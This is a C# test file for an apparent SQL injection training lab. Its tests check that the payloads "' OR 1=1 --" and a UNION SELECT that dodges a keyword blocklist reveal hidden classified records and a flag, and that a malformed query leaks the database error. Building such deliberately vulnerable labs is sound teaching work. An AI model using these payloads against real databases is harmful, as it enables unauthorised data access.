using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.Extensions.DependencyInjection;
using Trainer.Web.Core;

namespace Trainer.Web.Tests;

public class SqlInjectionLabTests(WebApplicationFactory<Program> factory) : IClassFixture<WebApplicationFactory<Program>>
{
    private const string Slug = "sql-injection";

    [Fact]
    public async Task Exploit_reveals_the_classified_prototype_and_the_flag()
    {
        var items = await Search("' OR 1=1 --");

        Assert.Contains(items, i => i.GetProperty("description").GetString()!.Contains(Get<FlagService>().GetFlag(Slug)));
    }

    [Fact]
    public async Task Union_select_without_or_also_works()
    {
        // The blocklist option rejects --, ;, OR and /*; this payload needs none of them.
        var items = await Search("x' UNION SELECT Id, Name, Quantity, Hold, Description, IsClassified FROM " +
                                 "(SELECT Id, Name, Quantity, Hold, Description, 0 AS IsClassified, IsClassified AS c FROM CargoItems) " +
                                 "WHERE c = 1 AND Name LIKE '%");

        Assert.Equal(2, items.Length);
    }

    [Fact]
    public async Task Normal_search_hides_classified_items()
    {
        var items = await Search("phaser");
        var all = await Search("");

        Assert.Equal(2, items.Length);
        Assert.DoesNotContain(all, i => i.GetProperty("description").GetString()!.Contains("FLAG{"));
    }

    [Fact]
    public async Task Broken_sql_returns_the_database_error()
    {
        var response = await Client().GetAsync($"/api/labs/{Slug}/cargo?search='");

        Assert.Equal(HttpStatusCode.InternalServerError, response.StatusCode);
        Assert.Contains("SQLite", await response.Content.ReadAsStringAsync());
    }

    [Fact]
    public async Task Cargo_follows_accept_language()
    {
        var client = Client();
        client.DefaultRequestHeaders.AcceptLanguage.ParseAdd("de");

        var items = await client.GetFromJsonAsync<JsonElement[]>($"/api/labs/{Slug}/cargo?search=phaser");

        Assert.Contains(items!, i => i.GetProperty("name").GetString() == "Phasergewehre, Typ 3");
    }

    [Fact]
    public async Task Anonymous_callers_are_rejected()
    {
        Assert.Equal(HttpStatusCode.Unauthorized, (await factory.CreateClient().GetAsync($"/api/labs/{Slug}/cargo?search=x")).StatusCode);
    }

    [Fact]
    public async Task Reset_restores_initial_data()
    {
        // Stacked queries are not supported by EF's FromSqlRaw, so check reset by count instead.
        Get<LabRegistry>().Find(Slug)!.Reset();

        Assert.Equal(12, (await Search("")).Length);
    }

    private async Task<JsonElement[]> Search(string term) =>
        (await Client().GetFromJsonAsync<JsonElement[]>($"/api/labs/{Slug}/cargo?search={Uri.EscapeDataString(term)}"))!;

    private HttpClient Client()
    {
        var client = factory.CreateClient();
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", Get<DemoAuth>().GetToken(Slug, DemoAuth.Player));
        return client;
    }

    private T Get<T>() where T : notnull => factory.Services.GetRequiredService<T>();
}
